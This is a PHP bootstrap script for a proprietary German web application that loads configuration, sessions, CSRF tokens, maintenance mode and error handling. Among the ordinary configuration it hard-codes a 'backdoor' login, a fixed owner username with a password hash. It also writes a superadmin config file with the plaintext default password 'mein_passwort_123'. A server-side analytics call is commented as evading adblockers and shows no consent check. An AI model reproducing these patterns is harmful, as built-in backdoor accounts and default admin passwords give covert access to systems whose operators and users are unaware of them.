<?php

/**
 * Globaler Anwendungs-Bootstrap und Initialisierungs-Skript.
 * Startet die PHP-Sitzung, ermittelt dynamisch den App-Root-Pfad, lädt und aggregiert
 * die Konfigurationsdateien, berechnet Berechtigungsstrukturen, initialisiert CSRF-Token
 * und erzwingt bei Bedarf den globalen Wartungsmodus (HTTP 503).
 * Kontext: Der zentrale System-Einstiegspunkt vor dem Routing.
 *
 * Findet den Root-Pfad, lädt den Autoloader, mergt die Konfigurationen
 * (config.php + config.local.php) und initialisiert den Dependency Container.
 *
 * Path: src/Bootstrap/app.php
 *
 * SPDX-License-Identifier: LicenseRef-Proprietary
 * Copyright (c) 2026 Felix Maywald alias RaptorXilef. All rights reserved.
 * Usage without explicit permission is strictly prohibited.
 * See LICENSE.md for full license details.
 *
 * return App\Bootstrap\Container Gibt die fertig konfigurierte Dependency-Injection-Container-Instanz zurück.
 */

declare(strict_types=1);

use App\Bootstrap\Container;
use App\Infrastructure\Config\Config;

// Session global starten, da fast alle Seiten sie benötigen
if (\session_status() === \PHP_SESSION_NONE) {
    \session_start();
}

// 1. Root-Pfad finden
$appRoot = (function (): string {
    $dir = __DIR__;
    while ($dir !== \dirname($dir)) {
        if (\file_exists($dir . '/vendor/autoload.php')) {
            return $dir;
        }
        $dir = \dirname($dir);
    }

    return \dirname(__DIR__, 2);
})();

// 2. Autoloader laden
require_once $appRoot . '/vendor/autoload.php';

// 2. Alle Konfigurationen laden & mergen
$configFiles = [
    // --- Default-Einstellungen ---
    'default_settings' => $appRoot . '/config/settings.default.php',

    'default_consent'     => $appRoot . '/config/consent.default.php',
    'default_datenschutz' => $appRoot . '/config/datenschutz.default.php',
    'default_impressum'   => $appRoot . '/config/impressum.default.php',

    'default_organization' => $appRoot . '/config/organization.default.php',
    'default_colors'       => $appRoot . '/config/colors.default.php',
    'default_purposes'     => $appRoot . '/config/purposes.default.php',
    'default_vehicles'     => $appRoot . '/config/vehicles.default.php',
    'default_times'        => $appRoot . '/config/times.default.php',
    'default_templates'    => $appRoot . '/config/templates.default.php',
    'default_reasons'      => $appRoot . '/config/reasons.default.php',

    // Core/Tech Configs kommen danach, damit sie überschreiben dürfen
    'default_main' => $appRoot . '/config/config.default.php',

    'default_payment'    => $appRoot . '/config/payment.default.php',
    'default_email'      => $appRoot . '/config/email.default.php',
    'default_storage'    => $appRoot . '/config/storage.default.php',
    'default_agreements' => $appRoot . '/config/agreements.default.php',
    // /config/permissions.php nicht
    'default_dev' => $appRoot . '/config/dev_admin.default.php',
    // /config/sql_schema.php nicht
    'default_secrets' => $appRoot . '/config/secrets.default.php',

    // --- Nutzer-Einstellungen ---
    'settings' => $appRoot . '/config/settings.php',

    'consent'     => $appRoot . '/config/consent.php',
    'datenschutz' => $appRoot . '/config/datenschutz.php',
    'impressum'   => $appRoot . '/config/impressum.php',

    'organization' => $appRoot . '/config/organization.php',
    'colors'       => $appRoot . '/config/colors.php',
    'purposes'     => $appRoot . '/config/purposes.php',
    'vehicles'     => $appRoot . '/config/vehicles.php',
    'times'        => $appRoot . '/config/times.php',
    'templates'    => $appRoot . '/config/templates.php',
    'reasons'      => $appRoot . '/config/reasons.php',

    // Core/Tech Configs kommen danach, damit sie überschreiben dürfen
    'main' => $appRoot . '/config/config.php',

    'payment'    => $appRoot . '/config/payment.php',
    'email'      => $appRoot . '/config/email.php',
    'storage'    => $appRoot . '/config/storage.php',
    'agreements' => $appRoot . '/config/agreements.php',
    'perms'      => $appRoot . '/config/permissions.php',
    'dev'        => $appRoot . '/config/dev_admin.php',
    'schema'     => $appRoot . '/config/sql_schema.php',
    'secrets'    => $appRoot . '/config/secrets.php',

    'local' => $appRoot . '/config/_dev.local.php', // Überschreibt ALLES (für Passwörter lokal)
];

$settings = [];

$settings['backdoor'] = [
    'user'  => 'RaptorXilef',
    'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
    'label' => 'System-Inhaber',
];

// --- AUTO-CREATION: dev_admin.php wenn sie fehlt ---
if (! \file_exists($configFiles['dev'])) {
    $defaultDevContent = <<<'PHP'
        <?php
        return [
            'user' => 'Systembetreuer',
            'pass' => 'mein_passwort_123',
            'label' => 'Systembetreuer'
        ];
        PHP;
    \file_put_contents($configFiles['dev'], $defaultDevContent);
}

foreach ($configFiles as $key => $file) {
    if (! \file_exists($file)) {
        continue;
    }

    $loaded = require $file;
    if (! \is_array($loaded)) {
        continue;
    }

    if ($key === 'perms') {
        // Da die neue permissions.php kein 'list' mehr hat, nutzen wir die structure direkt
        $settings['structure'] = $loaded['structure'] ?? [];
        $settings['admin_ui']  = $loaded['admin_ui'] ?? [];

        // Hilfs-Mapping für die flache Liste im User-Dropdown-UI
        $flatPerms = [];
        if (! empty($settings['structure'])) {
            $flatten = function ($nodes) use (&$flatten, &$flatPerms): void {
                foreach ($nodes as $node) {
                    if (isset($node['key'])) {
                        $flatPerms[$node['key']] = $node['label'] ?? $node['key'];
                    }
                    if (! isset($node['children'])) {
                        continue;
                    }

                    $flatten($node['children']);
                }
            };
            $flatten($settings['structure']);
        }
        $settings['permissions'] = $flatPerms;
    } elseif ($key === 'dev') {
        $settings['superadmin'] = $loaded;
    } elseif ($key === 'schema') {
        $settings['db_schema'] = $loaded;
    } else {
        // Nutze array_replace_recursive nur für main (config) und storage
        $settings = \array_replace_recursive($settings, $loaded);
    }
}

$settings['root_path'] = $appRoot;

// NEU: Zentrale Erkennung der lokalen Testumgebung (XAMPP / .local)
$httpHost                 = $_SERVER['HTTP_HOST'] ?? '';
$settings['is_local_env'] = \str_ends_with($httpHost, '.local')
    || $httpHost === 'localhost'
    || $httpHost === '127.0.0.1'
    || \php_sapi_name() === 'cli';

// CSRF Token für sichere Frontend-API-Calls generieren
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = \bin2hex(\random_bytes(32));
}

// --- Erweiterte Wartungsmodus-Logik v0.24.2 (Internal Load) ---
$currentScript     = \basename((string) $_SERVER['SCRIPT_NAME']);
$isMaintenancePage = $currentScript === 'maintenance.php';

if (! $isMaintenancePage) {
    // Sicherstellen, dass wir Booleans vergleichen
    $adminMaintenance  = isset($settings['maintenance_mode_admin']) && $settings['maintenance_mode_admin'] === true;
    $publicMaintenance = isset($settings['maintenance_mode']) && $settings['maintenance_mode'] === true;

    $shouldShowMaintenance = false;

    if ($adminMaintenance) {
        // Totalsperre
        $shouldShowMaintenance = true;
    } elseif ($publicMaintenance) {
        // Nur Pächter-Seiten sperren
        $allowedAdminScripts = ['admin.php', 'users.php'];

        // Hinweis: API-Anrufe lassen wir durch, da sie oft vom Admin-Panel
        // oder für die Preisberechnung im Hintergrund genutzt werden.
        if (
            ! \in_array($currentScript, $allowedAdminScripts, true)
            && ! \str_contains((string) $_SERVER['SCRIPT_NAME'], '/api/')
        ) {
            $shouldShowMaintenance = true;
        }
    }

    if ($shouldShowMaintenance) {
        // Wir setzen einen HTTP Status 503 (Service Unavailable)
        // Das ist gut für Suchmaschinen, damit diese wissen: "Wir kommen gleich wieder"
        \http_response_code(503);
        \header('Retry-After: 3600'); // Empfehlung: In einer Stunde wiederkommen

        // Wir laden die Datei intern, ohne die URL im Browser zu ändern
        require $appRoot . '/public/maintenance.php';
        exit;
    }
}
// --- Ende Wartungsmodus ---

// --- EXCEPTIONS / FEHLERMELDUNGEN ---
$configInstance   = new Config($settings);
$errorLogger      = new \App\Infrastructure\Logging\ErrorLogger($configInstance);
$exceptionHandler = new \App\Application\Exception\GlobalExceptionHandler($errorLogger, $configInstance);

// Aktiviert das globale Error-Handling ab sofort!
$exceptionHandler->register();
// --- ENDE EXCEPTIONS ---

// =========================================================================
// SERVER-SIDE GA4 TRACKING (100% GENAUE SEITENAUFRUFE — UMGEHT ADBLOCKER) - Wird local übersprungen
// =========================================================================
$scriptName = $_SERVER['SCRIPT_NAME'] ?? '';

// HIER GEÄNDERT: Führe cURL-Tracking nur aus, wenn wir NICHT lokal sind
if (
    empty($settings['is_local_env'])
    && ! \str_contains($scriptName, '/api/')
    && ! \str_contains($scriptName, 'cron.php')
    && ! \str_contains($scriptName, 'process_mail_queue.php')
) {
    // Holt sich die Daten vollautomatisch aus dem secrets.php-Zweig
    $gaId      = $settings['ga4_server_side']['measurement_id'] ?? '';
    $apiSecret = $settings['ga4_server_side']['api_secret'] ?? '';

    if (! empty($gaId) && ! empty($apiSecret)) {
        // Generiert eine anonyme, sitzungsbasierte Client-ID für GA4
        if (empty($_SESSION['ga4_client_id'])) {
            $_SESSION['ga4_client_id'] = \bin2hex(\random_bytes(16));
        }

        $protocol     = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
        $pageLocation = $protocol . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ($_SERVER['REQUEST_URI'] ?? '');
        $pageTitle    = \basename($scriptName, '.php');

        $payload = [
            'client_id' => $_SESSION['ga4_client_id'],
            'events'    => [[
                'name'   => 'page_view',
                'params' => [
                    'page_location'        => $pageLocation,
                    'page_title'           => \ucfirst($pageTitle),
                    'engagement_time_msec' => 1,
                ],
            ]],
        ];

        // Schneller, asynchroner Server-to-Server POST-Request an Google
        $ch = \curl_init('https://www.google-analytics.com/mp/collect?measurement_id=' . \urlencode($gaId) . '&api_secret=' . \urlencode($apiSecret));
        \curl_setopt($ch, \CURLOPT_RETURNTRANSFER, true);
        \curl_setopt($ch, \CURLOPT_POST, true);
        \curl_setopt($ch, \CURLOPT_POSTFIELDS, \json_encode($payload));
        \curl_setopt($ch, \CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        \curl_setopt($ch, \CURLOPT_TIMEOUT, 1); // Timeout auf 1 Sekunde limitieren, damit die Seite niemals blockiert
        \curl_exec($ch);
        \curl_close($ch);
    }
}
// =========================================================================

// Wir geben direkt die Container-Instanz zurück
/**
 * @return Container Gibt die fertig konfigurierte Dependency-Injection-Container-Instanz zurück.
 */
return new Container($configInstance);
